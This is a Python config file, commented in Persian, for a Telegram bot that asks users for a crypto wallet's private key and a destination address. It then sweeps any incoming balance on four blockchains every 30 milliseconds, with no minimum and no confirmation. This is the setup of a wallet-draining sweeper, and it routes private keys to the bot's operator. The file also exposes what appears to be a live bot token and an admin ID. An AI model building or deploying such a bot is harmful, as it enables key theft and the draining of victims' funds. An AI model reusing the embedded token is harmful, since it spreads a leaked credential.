# config.py - تنظیمات نهایی ربات انتقال خودکار

# تنظیمات تلگرام (حتماً توکن ربات را بررسی کنید)
TELEGRAM_BOT_TOKEN = "7678697695:AAGAu62W-RwXgTt7igKQWy-Yxl4NM5O9JIo"
TELEGRAM_ADMINS = [6329203972]  # عددی UserID شما در تلگرام (از @userinfobot بگیرید)

# تنظیمات شبکه‌ها با RPCهای پرسرعت
NETWORKS = {
    'ethereum': {
        'rpc': 'https://eth.llamarpc.com',
        'scan': 'https://etherscan.io/tx/',
        'chain_id': 1,
        'native_token': 'ETH'
    },
    'bsc': {
        'rpc': 'https://bsc-dataseed1.defibit.io',
        'scan': 'https://bscscan.com/tx/',
        'chain_id': 56,
        'native_token': 'BNB'
    },
    'polygon': {
        'rpc': 'https://polygon-bor.publicnode.com',
        'scan': 'https://polygonscan.com/tx/',
        'chain_id': 137,
        'native_token': 'MATIC'
    },
    'base': {
        'rpc': 'https://base.publicnode.com',
        'scan': 'https://basescan.org/tx/',
        'chain_id': 8453,
        'native_token': 'ETH'
    }
}

# تنظیمات فنی
CHECK_INTERVAL = 0.03  # 30 میلی‌ثانیه
GAS_LIMIT = 21000
MAX_RETRIES = 5  # تعداد دفعات تلاش مجدد
RETRY_DELAY = 2  # ثانیه

# تنظیمات انتقال (همانطور که خواستید)
MINIMUM_TRANSFER = 0  # حداقل انتقال = 0 (حتی مقادیر بسیار کم)
SAFE_MODE = False  # تأییدیه نمی‌خواهد

# تنظیمات پیام‌ها
MESSAGES = {
    'start': "🤖 به ربات انتقال فوری خوش آمدید!\n🔐 لطفا کلید خصوصی کیف پول را ارسال کنید:",
    'invalid_pk': "❌ کلید خصوصی نامعتبر! فرمت صحیح: 66 کاراکتر با 0x شروع شود",
    'ask_destination': "📭 لطفا آدرس مقصد را ارسال کنید:",
    'invalid_address': "❌ آدرس نامعتبر! لطفا آدرس صحیح بلاکچین را وارد کنید",
    'start_monitoring': "✅ مانیتورینگ آغاز شد!\n\n🔹 شبکه‌های تحت نظر:\n- Ethereum\n- BSC\n- Polygon\n- Base\n\nهر موجودی وارد شده به کیف پول شما فوراً انتقال داده می‌شود.",
    'transfer_alert': "⚠️ انتقال انجام شد!\n▸ شبکه: {network}\n▸ مقدار: {amount} {symbol}\n▸ کارمزد: {fee} {symbol}\n▸ Tx: {tx_url}"
}

# RPCهای جایگزین
BACKUP_RPCS = {
    'ethereum': ['https://rpc.ankr.com/eth', 'https://cloudflare-eth.com'],
    'bsc': ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed2.ninicoin.io'],
    'polygon': ['https://polygon-rpc.com', 'https://rpc-mainnet.matic.quiknode.pro'],
    'base': ['https://mainnet.base.org', 'https://developer-access-mainnet.base.org']
}